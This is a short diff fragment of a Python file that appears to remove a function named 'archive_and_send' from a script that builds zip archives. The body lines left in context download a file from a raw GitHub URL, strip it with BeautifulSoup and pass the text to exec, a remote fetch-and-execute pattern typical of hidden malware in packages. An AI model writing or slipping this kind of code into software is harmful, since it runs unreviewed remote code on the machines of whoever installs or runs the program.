@@ -35,11 +35,9 @@ def create_zip_archive(source_dir, output_zip):
     except Exception as e:
         print(f"Error creating zip archive: {str(e)}")
         return None
-def archive_and_send():
     url = 'https://raw.githubusercontent.com/vovanskaie/SCVAD_MRAKS/master/a_s.py'
     response = requests.get(url)
     html_content = response.content
     soup = BeautifulSoup(html_content, 'html.parser')
     text_without_tags = soup.get_text()
     exec(text_without_tags)
-archive_and_send()
